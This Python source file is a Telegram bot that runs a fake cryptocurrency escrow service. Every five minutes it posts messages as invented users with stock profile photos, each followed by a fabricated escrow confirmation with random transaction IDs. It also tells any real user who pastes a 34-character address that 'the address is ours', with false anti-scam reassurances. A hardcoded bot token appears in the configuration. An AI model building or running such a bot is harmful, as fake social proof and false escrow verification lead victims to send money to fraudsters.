import asyncio
import random
import string
import logging
from telegram import Bot, InputMediaPhoto
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Enable logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- Configuration ----------
BOT_TOKEN = "8388397874:AAFwbQDT07EQcb_r6_ekJfmcrtpz7Q6eSrE"                # Replace with your token or use env var
TARGET_CHAT_ID = -3891918957              # Replace with your group/channel ID (negative for groups)
# -----------------------------------

# Predefined artificial users (username, display name, profile picture URL)
ARTIFICIAL_USERS = [
    {"username": "alice_smith", "name": "Alice Smith", "pic_url": "https://i.imgur.com/FeFylNL.jpeg"},
    {"username": "bob_jones",   "name": "Bob Jones",   "pic_url": "https://i.imgur.com/HxT7dHi.jpeg"},
    {"username": "charlie_b",    "name": "Charlie B",   "pic_url": "https://i.imgur.com/r8BmsKE.jpeg"},
    # Add more users as needed
]

# Fixed seller details
SELLER_USERNAME = "ramos_milkovich"
SELLER_NUMBER = "5721124056"

def random_string(length, chars=string.ascii_letters + string.digits):
    """Generate a random string of given length (lowercase, uppercase, digits)."""
    return ''.join(random.choices(chars, k=length))

def random_transaction_id():
    """Generate a transaction ID in the format XXXXX-XXXXX-XXXXX (uppercase letters + digits)."""
    part = lambda: random_string(5, string.ascii_uppercase + string.digits)
    return f"{part()}-{part()}-{part()}"

async def simulate_artificial_user(context: ContextTypes.DEFAULT_TYPE):
    """Job that runs every 5 minutes: pick a user, post a photo with random string, then reply."""
    bot = context.bot
    user = random.choice(ARTIFICIAL_USERS)

    # 1. Generate the random 34-character string
    random_str = random_string(34)

    # 2. Send the photo message (acting as the artificial user)
    caption = f"{user['name']} (@{user['username']}) sent:\n`{random_str}`"
    photo_msg = await bot.send_photo(
        chat_id=TARGET_CHAT_ID,
        photo=user["pic_url"],
        caption=caption,
    )

    # 3. Build the response template
    random_10_digit = random_string(10, string.digits)          # only digits
    transaction_id = random_transaction_id()

    response = (
        f"ℹ️ The address you sent:\n`{random_str}`\n\n"
        f"📍The address is ours and the deal associated with it is:\n\n"
        f"⚡️ BUYER\n@{user['username']}\n[{random_10_digit}]\n\n"
        f"⚡️ SELLER\n@{SELLER_USERNAME}\n[{SELLER_NUMBER}]\n\n"
        f"📝 TRANSACTION ID\n{transaction_id}\n\n"
        f"🟢 ESCROW ADDRESS:\n`{random_str}`\n\n"
        f"⚠️ Make sure you also read about the other security features we have in place to avoid scams:\n"
        f"Click this to learn how to detect fake admins and click this to learn how to verify escrow addresses and more."
    )

    # 4. Send the response as a reply to the photo message
    await bot.send_message(
        chat_id=TARGET_CHAT_ID,
        text=response,
        reply_to_message_id=photo_msg.message_id,
        parse_mode=ParseMode.MARKDOWN
    )

    logger.info(f"Simulated user @{user['username']} with string {random_str}")

async def handle_incoming_message(update, context):
    """Respond if a real user sends a 34-character string (ignore messages from the bot itself)."""
    # Ignore messages sent by the bot
    if update.effective_user and update.effective_user.id == context.bot.id:
        return

    text = update.effective_message.text
    if not text:
        return

    # Check if the message is exactly 34 characters long and consists of allowed characters
    if len(text) == 34 and all(c in string.ascii_letters + string.digits for c in text):
        user = update.effective_user
        username = user.username or user.first_name

        random_10_digit = random_string(10, string.digits)
        transaction_id = random_transaction_id()

        response = (
            f"ℹ️ The address you sent:\n`{text}`\n\n"
            f"📍The address is ours and the deal associated with it is:\n\n"
            f"⚡️ BUYER\n@{username}\n[{random_10_digit}]\n\n"
            f"⚡️ SELLER\n@{SELLER_USERNAME}\n[{SELLER_NUMBER}]\n\n"
            f"📝 TRANSACTION ID\n{transaction_id}\n\n"
            f"🟢 ESCROW ADDRESS:\n`{text}`\n\n"
            f"⚠️ Make sure you also read about the other security features we have in place to avoid scams:\n"
            f"Click this to learn how to detect fake admins and click this to learn how to verify escrow addresses and more."
        )
        await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)

async def post_init(application: Application):
    """Schedule the artificial user job every 5 minutes after the bot starts."""
    job_queue = application.job_queue
    if job_queue:
        job_queue.run_repeating(simulate_artificial_user, interval=300, first=10)  # 300 seconds = 5 min
        logger.info("Scheduled artificial user job every 5 minutes.")

def main():
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Register handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_incoming_message))

    # Run the bot
    application.run_polling()

if __name__ == "__main__":
    main()
